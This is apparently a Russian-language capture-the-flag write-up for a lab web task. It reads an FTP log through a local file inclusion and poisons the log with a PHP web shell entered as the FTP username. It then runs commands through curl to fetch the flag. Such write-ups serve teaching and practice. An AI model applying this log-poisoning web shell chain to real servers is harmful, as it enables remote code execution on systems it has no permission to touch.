# web-2-2: RCE. Write-Up

## Метаданные

| Поле | Значение |
|:-----|:---------|
| Задачи | web-2-2 (RCE) |
| Узел | www.edu.stf (10.124.1.235) |
| Категория | Web / Remote Code Execution |

## Разведка

```bash
$nmap -Pn -sV www.edu.stf

Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-19 13:17 UTC
Nmap scan report for www.edu.stf (10.124.1.235)
Host is up (0.013s latency).
Not shown: 966 filtered tcp ports (no-response), 31 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds
```

АГА, найден ftp.

## Пробуем прочитать логи через LFI:

```bash
curl "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log"

Mon Oct 19 08:47:17 2026 [pid 842391] CONNECT: Client "10.127.214.138"
Mon Oct 19 08:47:24 2026 [pid 842388] [s] FAIL LOGIN: Client "10.127.214.138"
```

Логи получены, более того в лог записывается имя подключавшегося.
Более того, мы знаем что сайт использует PHP и мы имеем LFI.

Значит можно попробовать сделать reverse-shell:

```php
<?php system($_GET['ci']); ?>
```

Именно эти строки мы будем вводить вместо имени при подключении ftp:
```bash
ftp www.edu.stf
Connected to www.edu.stf.
220 (vsFTPd 3.0.3)
Name (www.edu.stf:user): <?php system($_GET['ci']); ?>
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp> quit
221 Goodbye.
┌─[user@parrot]─[~/bootcamp7/web-2/1]
└──╼ $curl "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log"

Mon Oct 19 08:53:19 2026 [pid 985390] CONNECT: Client "10.127.214.138"
Mon Oct 19 08:53:23 2026 [pid 985388] [sdfsdf] FAIL LOGIN: Client "10.127.214.138"
Mon Oct 19 08:53:34 2026 [pid 991360] CONNECT: Client "10.127.214.138"
Mon Oct 19 08:53:49 2026 [pid 991351] [┌─[user@parrot]─[~/bootcamp7/web-2/1]
└──╼ $
```

Ага, а теперь проверим работает ли RCE:
```bash
curl "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log&ci=ls"

Mon Oct 19 08:56:15 2026 [pid 1055566] CONNECT: Client "10.127.214.138"
Mon Oct 19 08:56:20 2026 [pid 1055564] [read.php
] FAIL LOGIN: Client "10.127.214.138"
┌─[user@parrot]─[~/bootcamp7/web-2/1]
└──╼ $
```

## Эксплуатация RCE:

RCE получен, пытаемся получить флаг:
```bash
curl "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log&ci=/home/rceflag"

Mon Oct 19 08:56:15 2026 [pid 1055566] CONNECT: Client "10.127.214.138"
Mon Oct 19 08:56:20 2026 [pid 1055564] [e42425d0-80c6-49ff-a714-d82636af782d
] FAIL LOGIN: Client "10.127.214.138"
Mon Oct 19 08:56:49 2026 [pid 1069092] CONNECT: Client "10.127.192.70"
Mon Oct 19 08:56:50 2026 [pid 1069086] [┌─[user@parrot]─[~/bootcamp7/web-2/1]
└──╼ $
```

Флаг успешно получен:`e42425d0-80c6-49ff-a714-d82636af782d` 
